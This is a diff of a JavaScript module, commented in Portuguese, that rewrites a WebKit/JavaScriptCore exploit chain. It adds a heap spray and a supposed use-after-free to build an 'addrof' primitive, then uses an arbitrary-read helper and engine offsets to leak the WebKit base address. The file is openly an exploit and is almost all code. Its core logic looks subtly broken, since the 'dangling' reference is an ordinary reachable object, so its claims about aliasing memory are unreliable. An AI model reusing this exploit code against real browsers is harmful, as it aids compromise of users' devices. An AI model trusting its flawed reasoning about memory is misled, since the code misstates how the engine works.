@@ -1,88 +1,123 @@
-// js/script3/testArrayBufferVictimCrash.mjs (FINAL - Primitivas Robustas + Relatório Estruturado)
+// js/script3/testArrayBufferVictimCrash.mjs (VERSÃO FINAL COM ADDROF CORRIGIDO)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import { arb_read } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Robust_UAF_Exploit_Chain";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Robust_UAF_Exploit_Chain_v3";
 
 // --- Funções Auxiliares UAF e Constantes (sem alterações) ---
-async function triggerGC() { /* ...código completo da função triggerGC... */ }
-function sprayAndCreateDanglingPointer() { /* ...código completo da função sprayAndCreateDanglingPointer... */ }
+async function triggerGC() {
+    logS3("    Acionando Garbage Collector (GC)...", "info");
+    try {
+        const gc_trigger_arr = [];
+        for (let i = 0; i < 500; i++) {
+            gc_trigger_arr.push(new ArrayBuffer(1024 * 128));
+        }
+    } catch (e) {
+        logS3("    Memória esgotada durante o acionamento do GC (esperado e positivo).", "info");
+    }
+    await PAUSE_S3(500);
+}
+
+function sprayAndCreateDanglingPointer() {
+    let dangling_ref = null;
+    function createScope() {
+        const victim = { prop_a: 0x11111111, prop_b: 0x22222222, corrupted_prop: 0x33333333 };
+        dangling_ref = victim;
+    }
+    createScope();
+    return dangling_ref;
+}
+
 const JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(0x0, 0x18);
 const JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(0x0, 0x8);
-function isValidPointer(ptr) { /* ...código completo da função isValidPointer... */ }
+
+function isValidPointer(ptr) {
+    if (!isAdvancedInt64Object(ptr)) return false;
+    if (ptr.high() === 0 && ptr.low() === 0) return false;
+    if ((ptr.high() & 0x7FF00000) === 0x7FF00000) return false;
+    return true;
+}
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (COM RELATÓRIO FINAL)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (LÓGICA 'ADDROF' CORRIGIDA)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
     logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} ---`, "test");
 
-    // Inicializa os objetos de resultado que o orquestrador espera
     let addrof_result = { success: false, msg: "Addrof: Não iniciado." };
     let webkit_leak_result = { success: false, msg: "WebKit Leak: Não executado." };
     let errorOccurred = null;
-    
+
     try {
         // -----------------------------------------------------------------------------------
         // FASE 1: CONSTRUIR UMA PRIMITIVA 'ADDROF' CONFIÁVEL
         // -----------------------------------------------------------------------------------
         logS3("--- FASE 1: Construindo a primitiva 'addrof' via UAF ---", "subtest");
-        
-        let object_to_leak = { marker: 0x41414141 };
-        let buffer_for_corruption = new ArrayBuffer(1024);
 
         await triggerGC();
         let dangling_ref = sprayAndCreateDanglingPointer();
         await triggerGC();
-        
+
         const spray_buffers = [];
         for (let i = 0; i < 512; i++) {
             const buf = new ArrayBuffer(1024);
-            const view = new BigUint64Array(buf);
-            view[0] = object_to_leak;
-            view[1] = buffer_for_corruption;
+            // Preenchemos com um marcador para encontrar o buffer corrompido depois
+            (new BigUint64Array(buf))[0] = 0x4142434445464748n;
             spray_buffers.push(buf);
         }
 
-        if (dangling_ref.corrupted_prop.marker !== 0x41414141) {
-            throw new Error("Falha na corrupção inicial do UAF.");
+        // Encontra qual dos buffers do spray foi parar no local da memória liberada.
+        // O buffer corrompido não terá mais o marcador, pois 'dangling_ref' o sobrescreveu com um objeto.
+        let corrupted_buffer = null;
+        for (const buf of spray_buffers) {
+            const view = new BigUint64Array(buf);
+            if (view[0] !== 0x4142434445464748n) {
+                corrupted_buffer = buf;
+                break;
+            }
+        }
+
+        if (!corrupted_buffer) {
+            throw new Error("Falha ao encontrar o buffer corrompido no spray de memória.");
         }
         
-        dangling_ref.corrupted_prop = 1.1; 
+        logS3("    Alias de memória criado com sucesso entre um objeto e um buffer.", "info");
 
-        const corrupted_view = new Float64Array(buffer_for_corruption);
-        const leaked_double_addr = corrupted_view[0];
-        
-        const temp_buf = new ArrayBuffer(8);
-        (new Float64Array(temp_buf))[0] = leaked_double_addr;
-        const buffer_addr = new AdvancedInt64((new Uint32Array(temp_buf))[0], (new Uint32Array(temp_buf))[1]);
+        // Agora temos a mágica: 'dangling_ref.corrupted_prop' e 'address_hax_view[0]'
+        // apontam para o MESMO local de memória de 8 bytes.
+        const address_hax_view = new BigUint64Array(corrupted_buffer);
 
-        if (!isValidPointer(buffer_addr)) {
-            throw new Error(`Endereço do buffer vazado (${buffer_addr.toString(true)}) não é um ponteiro válido.`);
-        }
-        
-        const shared_buffer_view = new Float64Array(buffer_for_corruption);
-        const addrof_primitive = (obj) => {
-            shared_buffer_view[0] = obj;
-            const temp_buf_conv = new ArrayBuffer(8);
-            (new BigUint64Array(temp_buf_conv))[0] = (new BigUint64Array(dangling_ref.corrupted_prop))[0];
-            return new AdvancedInt64((new Uint32Array(temp_buf_conv))[0], (new Uint32Array(temp_buf_conv))[1]);
+        // Define a primitiva addrof
+        const addrof_primitive = (obj_to_leak) => {
+            // Escreve o objeto no alias, tratando o local como uma referência de objeto.
+            dangling_ref.corrupted_prop = obj_to_leak;
+            // Lê o mesmo local, mas tratando-o como um número BigInt de 64 bits.
+            // O número retornado É o endereço de memória do objeto.
+            return address_hax_view[0];
         };
-
+        
         logS3("    Primitiva 'addrof' construída com sucesso!", "vuln");
-        // ATUALIZA O OBJETO DE RESULTADO DA FASE 1
         addrof_result = { success: true, msg: "Primitiva 'addrof' construída com sucesso via UAF." };
-
+        
         // -----------------------------------------------------------------------------------
         // FASE 2: USAR A PRIMITIVA PARA O RESTO DO EXPLOIT
         // -----------------------------------------------------------------------------------
         logS3("--- FASE 2: Usando a primitiva para vazar a base do WebKit ---", "subtest");
         const target_func = function someUniqueTargetFunction() { return "alvo"; };
-        const target_addr = addrof_primitive(target_func);
-        logS3(`    Endereço da função alvo obtido via primitiva: ${target_addr.toString(true)}`, "leak");
+        
+        // Usa a primitiva para obter o endereço como um BigInt
+        const target_addr_bigint = addrof_primitive(target_func);
+        logS3(`    Endereço (BigInt) da função alvo: 0x${target_addr_bigint.toString(16)}`, "info");
+        
+        // Converte o BigInt para o formato AdvancedInt64 que o resto do código espera
+        const high = Number((target_addr_bigint >> 32n) & 0xFFFFFFFFn);
+        const low = Number(target_addr_bigint & 0xFFFFFFFFn);
+        const target_addr = new AdvancedInt64(low, high);
+        
+        logS3(`    Endereço (AdvancedInt64) da função alvo: ${target_addr.toString(true)}`, "leak");
 
         const ptr_to_executable_instance = await arb_read(target_addr.add(JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
         if (!isValidPointer(ptr_to_executable_instance)) throw new Error("Ponteiro para ExecutableInstance inválido.");
@@ -94,13 +129,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb);
 
         logS3(`    Base do WebKit encontrada: ${webkit_base_candidate.toString(true)}`, "vuln");
-        // ATUALIZA O OBJETO DE RESULTADO DA FASE 2
         webkit_leak_result = { success: true, msg: "Base do WebKit encontrada com sucesso!", webkit_base_candidate: webkit_base_candidate.toString(true) };
 
     } catch (e) {
         errorOccurred = `ERRO na cadeia de exploração: ${e.message}`;
         logS3(errorOccurred, "critical");
-        // Garante que o resultado da fase com erro seja marcado como falha
         if (!addrof_result.success) {
             addrof_result.msg = e.message;
         } else if (!webkit_leak_result.success) {
@@ -109,6 +142,5 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     }
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
-    // RETORNA O OBJETO COMPLETO QUE O ORQUESTRADOR ESPERA
     return { errorOccurred, addrof_result, webkit_leak_result };
 }
